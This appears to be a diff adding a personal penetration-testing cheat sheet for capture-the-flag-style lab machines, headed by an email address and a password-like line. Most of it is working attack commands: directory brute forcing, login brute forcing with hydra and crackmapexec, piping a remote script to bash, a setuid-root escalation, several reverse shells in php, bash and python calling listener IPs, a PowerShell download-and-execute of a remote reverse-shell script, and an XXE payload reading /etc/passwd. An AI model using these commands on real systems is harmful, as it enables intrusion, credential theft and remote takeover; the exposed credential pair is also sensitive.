@@ -1,0 +1,55 @@
+coshmeo@gmail.com
+thisisntmyrealpassword
+
+gobuster dir -u [url] -w [wordlist] -x [extensions] -o [outfile name] -t [thread count]
+use x to search for specific page extensions based on site architecture (.aspx, .txt, etc).
+
+check for password/usernames w .env (locate .env, cat .env)
+
+exiftool - inspect file metadata (images, pdfs, etc...)
+binwalk - another file inspection tool, can also extract data)
+	binwalk -Me ninenveh.png
+
+check for automated processes/cron jobs, if running chkrootkit can upgrade to root (searchsploit chkrootkit)
+
+port knocking
+check /etc/iptables
+search for knockd service, inspect /etc/knockd.conf, look at openssh
+for i in 1 2 3; do nmap -Pn -p $i --host_timeout 201 --max-retries 0 10.10.10.43; done
+	1 2 3 are the ports to "knock" per the /etc/knockd.conf instructions
+	
+
+crackmapexec: username/pw brute force (crackmapexec ssh academy.htb -u usernames.txt -p passwd.txt )
+
+hydra: another username/pw brute force 
+hydra -l admin -P /usr/share/wordlists/seclists/passwords/10k_most_common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
+-l 	user name
+-P	password file (-p is single password)
+http request type:login URL:request data:failed attempt marker
+-t set thread count
+
+curl 10.10.14.3:8000/linpeas.sh | bash (pipe to bash or it won't run)
+	adm member groups have access to /var/logs, use aureport (--help)
+
+https://gtfobins.github.io/gtfobins/python/#capabilities
+If the binary (python module) has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used 	as a backdoor to maintain privileged access by manipulating its own process UID.
+./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+reverse shells - is your listener ready? nc -lvnp 0000
+
+php -r '$sock=fsockopen("10.10.14.5",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'
+
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+
+XML External Entity (XXE)
+add things to existing XML requests to get back interesting data
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >[>
+<xml>
+	<stuff>&xxe;</stuff>
+</xml>
+https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
